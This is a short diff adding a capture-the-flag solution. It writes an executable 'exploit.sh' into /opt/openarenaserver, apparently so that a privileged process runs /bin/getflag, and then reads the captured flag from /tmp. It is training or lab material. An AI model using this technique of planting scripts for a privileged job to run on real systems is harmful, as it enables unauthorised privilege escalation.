@@ -1,0 +1,5 @@
+echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/exploit.sh
+
+chmod +x /opt/openarenaserver/exploit.sh
+
+cat /tmp/flag
